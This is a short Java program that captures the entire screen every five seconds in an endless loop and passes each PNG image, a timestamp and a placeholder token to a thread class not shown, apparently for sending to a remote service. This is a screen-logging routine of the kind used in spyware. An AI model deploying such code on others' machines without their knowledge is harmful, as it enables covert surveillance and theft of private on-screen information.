package com.home;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.TimeUnit;

public class Main {
    private static String token = "Your token";

    public static void main(String[] args) throws IOException, AWTException, InterruptedException {
        for (; ; ) {
            Date date = new Date();
            SimpleDateFormat date_now = new SimpleDateFormat("yyyyMMdd_hhmmss");
            String stringDate = date_now.format(date);
            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            ImageIO.write(image, "png", os);
            My_Thread thread_1 = new My_Thread(os, stringDate, token);
            thread_1.start();
            TimeUnit.MILLISECONDS.sleep(5_000);
        }
    }
}
